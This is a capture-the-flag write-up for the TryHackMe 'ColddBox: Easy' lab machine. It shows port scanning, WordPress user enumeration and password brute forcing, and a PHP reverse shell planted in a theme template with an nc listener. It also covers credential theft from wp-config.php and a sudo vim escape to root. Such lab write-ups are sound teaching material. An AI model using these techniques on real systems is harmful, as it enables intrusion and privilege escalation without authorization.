# THM: ColddBox: Easy

| Stat | Value |
| ---------- | -------------------------------------------- |
| Image | <img src="/images/write_ups/try_hack_me/coldd_box_easy/coldd_box_easy.png" alt="ColddBox: Easy" width="90"/> |
| Room | ColddBox: Easy |
| URL | https://tryhackme.com/room/colddboxeasy |
| Difficulty | Easy |

## Concepts/Tools Used

- [wpscan](/tools/wpscan.md)

## Room Description

An easy level machine with multiple ways to escalate privileges. By Hixec.

## Process

Once the machine starts up I save the machine's ip address to my host file so that I can type `target.thm` instead of an ip address.

I run nmap to see what ports are open:

```bash
$ nmap -T4 -n -sC -sV -Pn -v -p- target.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-15 15:31 BST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 15:31
Completed NSE at 15:31, 0.00s elapsed
Initiating NSE at 15:31
Completed NSE at 15:31, 0.00s elapsed
Initiating NSE at 15:31
Completed NSE at 15:31, 0.00s elapsed
Initiating ARP Ping Scan at 15:31
Scanning target.thm (10.10.207.231) [1 port]
Completed ARP Ping Scan at 15:31, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:31
Scanning target.thm (10.10.207.231) [65535 ports]
Discovered open port 80/tcp on 10.10.207.231
Discovered open port 4512/tcp on 10.10.207.231
Completed SYN Stealth Scan at 15:31, 2.00s elapsed (65535 total ports)
Initiating Service scan at 15:31
Scanning 2 services on target.thm (10.10.207.231)
Completed Service scan at 15:31, 6.26s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.207.231.
Initiating NSE at 15:31
Completed NSE at 15:31, 0.35s elapsed
Initiating NSE at 15:31
Completed NSE at 15:31, 0.02s elapsed
Initiating NSE at 15:31
Completed NSE at 15:31, 0.00s elapsed
Nmap scan report for target.thm (10.10.207.231)
Host is up (0.00034s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.1.31
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: ColddBox | One more machine
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)
|   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)
|_  256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519)
MAC Address: 02:26:5C:45:D5:67 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 15:31
Completed NSE at 15:31, 0.00s elapsed
Initiating NSE at 15:31
Completed NSE at 15:31, 0.00s elapsed
Initiating NSE at 15:31
Completed NSE at 15:31, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.34 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

Went to http://target.thm it is a wordpress site. I found a login form at http://target.thm/wp-login.php. I tried a few different username and password combinations, the form gives an interesting error message: ERROR: Invalid username.

Since it is a WordPress site, I run wpscan:

```bash
$ wpscan --no-update --url http://target.thm -e u -P /usr/share/wordlists/rockyou.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://target.thm/ [10.10.207.231]
[+] Started: Tue Jul 15 16:23:12 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://target.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://target.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://target.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://target.thm/?feed=rss2, <generator>https://wordpress.org/?v=4.1.31</generator>
 |  - http://target.thm/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.1.31</generator>

[+] WordPress theme in use: twentyfifteen
 | Location: http://target.thm/wp-content/themes/twentyfifteen/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://target.thm/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 2.9
 | Style URL: http://target.thm/wp-content/themes/twentyfifteen/style.css?ver=4.1.31
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://target.thm/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] the cold in person
 | Found By: Rss Generator (Passive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] Performing password attack on Wp Login against 4 user/s
[SUCCESS] - c0ldd / REDACTED
```

## Getting a Foothold

I log in with the credentials found at the end of the above output.  It turns out that c0ldd is an admin for the site! I can change the theme to use a PHP reverse shell and get a shell onto the server. I run the following to create a copy of the reverse shell file:

```bash
$ cp /usr/share/webshells/php/php-reverse-shell.php shell.php
```

I update the file to use my attack box ip address and port 4444. I start a listening shell on my attack machine with the following command:

```bash
$ nc -lnvp 4444
```

I alter the them in the WordPress site by clicking the Appearance > Theme Editor on the left. Then I click the 404.php template and paste the contents of the shell.php mentioned above. I click the Update button and then navigate to a page that will cause a 404 error. In my case, I went to http://target.thm/?p=-2

I have a shell. I'm in!

I get a stable shell by running the commands [found here](/README.md#stable-shell).

## user.txt

I check the home folder and see there is a user named c0ldd:

```bash
$ ls /home
c0ldd
```

There is a /home/c0ldd/user.txt file that I can't read and it is owned by c0ldd.

I tried my usual [privilege escalation commands](/concepts/privilege_escalation.md#linux-privilege-escalation). None of them found anything. Since I am on the www-data user I looked in the /var/www/html directory and looked at the wp-config.php file. It had the following lines:

```bash
$ cat /var/www/html/wp-config.php
...
/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', 'REDACTED');
...
```

I switch to the user c0ldd with the password just found:

```bash
$ su c0ldd
```

Now I read the contents of the user.txt file.

```bash
$ cd ~
$ cat user.txt
REDACTED
```

## Escalating Privileges

I run my [privilege escalation commands](/concepts/privilege_escalation.md#linux-privilege-escalation) again this time as c0ldd. I find something interesting:

```bash
$ sudo -l
Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
```

Game over, I can get a shell with vim since it allows users to run shell commands from vim and I can run vim as sudo. I do just that:

```bash
$ sudo /usr/bin/vim
```

Then while in vim I run the following:

```bash
:!/bin/bash
```

It worked. I'm in! The cursor changed to the # character to let me know that I am root.

## root.txt

Now I grab the root.txt file:

```bash
# whoami
root
# cd /root
# cat root.txt
REDACTED
```
